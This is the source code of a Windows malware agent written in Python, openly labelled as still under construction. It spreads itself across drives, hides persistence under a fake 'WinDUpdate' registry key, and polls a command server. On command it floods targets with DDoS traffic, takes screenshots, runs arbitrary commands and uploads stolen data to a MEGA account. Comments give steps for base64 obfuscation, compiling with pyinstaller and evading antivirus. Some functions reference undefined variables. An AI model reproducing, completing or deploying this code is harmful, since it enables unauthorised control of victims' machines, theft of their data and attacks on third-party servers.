import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2, platform
from mega import Mega
from datetime import datetime
#exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))

# TODO: obfuscate all function and variable names after completion
# TODO: setup tor capability
# TODO: change os.system to subprocess

# TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
# TODO: check anti-virus evasion/efficacy again
# NOTE: READ INSTRUCTIONS BELOW
#
# 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.exe file)
# 2) Go to https://www.base64encode.org/ and encode the entirety of the code BELOW (don't copy this comment block)
# 3) Copy the output of the base64 encoder website with the contents of your encoded program
# 4) Find the box above that says "BASE64 ENCODED PROGRAM GOES HERE" and replace it with the copied code
# 5) Remove all code from below (INCLUDING THESE COMMENTS)
# 6) Compile Moses to .exe using pyinstaller
#

def main():
    if (check_platform() == "32-bit"):
        # TODO: implement a self-destruct function? (maybe)
        pass

    URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
    master_filename = "moses.exe"

    win_user = get_win_user()

    path = ["\\AppData\\Roaming\\", "\\AppData\\Local\\"] # TODO: add more paths to store moses.exe

    for x in path:
        # this is fucky so it won't trigger av (as of now, it works...)
        try:
            shutil.copyfile(master_filename, "C:\\Users\\" + win_user + x + master_filename)
        except:
            pass
        finally:
            alphabet = list(string.ascii_uppercase)

            # copy master_file to every drive, pass on drive if error
            for x in alphabet:
                try:
                    shutil.copyfile(master_filename, x + ":\\" + master_filename)
                except:
                    pass

    for x in path:
        if (check_if_file_exists_in_path(x, win_user, master_filename)):
            os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + win_user + x + master_filename + '"')

            # NOTE: this isn't needed, but i'll keep it here incase I do later (not sure why i put it here to being with)
            path = x
            # it's now persistent, so break
            break
        else:
            pass

    # start main program loop
    while (True):
        # calling the variable signal seems to not trigger av, but it really should be command
        signal = get_web_content(URL, "1")

        if (signal == "1"): # ddos_target()
            target = get_web_content(URL, "2")
            stop_time = get_web_content(URL, "3")

            ddos_target(target, stop_time)
        elif (signal == "2"): # take_screenshot()
            take_screenshot(win_user)
        elif (signal == "3"): # get_pub_ip_address()
            get_pub_ip_address(sys_username)
        elif (signal == "4"): # execute_command()
            command = get_web_content(URL, "2")
            execute_command(command)
        # TODO
        #elif (signal == "3"):
        #    download_file()
        else:
            pass # command not recognized, or page is empty

        time.sleep(6)



###--- SYSTEM MODULES ---###
#NOTE: used for fetching web content
def get_web_content(URL, wb_path):
    try:
        response = urllib.request.urlopen(URL + "/tar" + wb_path + ".html")
        web_content = response.read().decode('utf-8').replace("\n", "")
    except:
        web_content = ""
    return web_content

# used for getting system username
def get_win_user():
    win_user = getpass.getuser()

    return win_user

# used for getting current system time
def get_current_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M") #24-hour clock format
    return current_time

def check_if_file_exists_in_path(x, win_user, master_filename):
    file_exists = os.path.isfile("C:\\Users\\" + win_user + x + master_filename)
    return file_exists

def check_platform():
    arch = platform.architecture()
    arch = arch[0]
    return arch

def upload_file(filename):
    counter = 0

    while (True):
        try: 
            #TODO: create a mega login function instead, as it'll cut down on redundancy
            mega = Mega()
            #TODO: find a better way than plaintext email and password...
            m = mega.login("USERNAME", "PASSWORD")

            m.upload(filename)

            # NOTE: this may not work. bug test this.
            os.remove(filename)

            break
        except:
            counter += 1

        if (counter < 30):
            time.sleep(30)
        else:
            break

#TODO: COMPLETE FUNCTION
# downloads file to root (master file's) dir from the root mega folder
def download_file(filename):
    #TODO: create a mega login function instead, as it'll cut down on redundancy
    mega = Mega()
    #TODO: find a better way than plaintext email and password...
    m = mega.login("USERNAME", "PASSWORD")

    filename = m.find(filename)
    m.download(filename)



###---COMMAND MODULES---###
# NOTE: change back to im_living when done (evades antivirus)
def ddos_target(target, stop_time): # 1
    source = str(socket.gethostbyname(socket.gethostname()))
    destination_port = 80

    while (True):
        if (get_current_time() == stop_time):
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, destination_port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, destination_port))
            s.sendto(("Host: " + source + "\r\n\r\n").encode('ascii'), (target, destination_port))
            s.close()
        except:
            pass

def take_screenshot(win_user): # 2
    filename = get_current_time()
    # example: 1357rethyxyz.png
    filename = str(filename.replace(":", ""))
    filename = filename + win_user + ".png"

    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

    upload_file(filename)

def execute_command(command): # subprocess here... output the stdout to a variable, a text file, to mega, then remove
    while (True):
        try:
            filename = get_current_time()
            filename = str(filename.replace(":", ""))
            filename = filename + sys_username + ".txt"

            try:
                stdout = subprocess.check_output([command])
            except subprocess.CalledProcessError as stdout:
                stdout = stdout

            f = open(filename, "w")
            f.write(stdout)
        except:
            counter += 1

        if (counter < 30):
            time.sleep(30)
        else:
            break

# TODO: test this
def get_pub_ip_address(sys_username):
    # TODO: edit the get_web_content() function to take full URLs in the future
    try:
        response = urllib.request.urlopen("http://icanhazip.com")
        ip_address = response.read().decode('utf-8').replace("\n", "")

        filename = get_current_time()
        filename = str(filename.replace(":", ""))
        filename = filename + sys_username + ".txt"

        f = open(filename, "w")
        f.write(ip_address)
        f.close()

        upload_file(filename)
    except:
        web_content = ""
    return web_content
    
main()
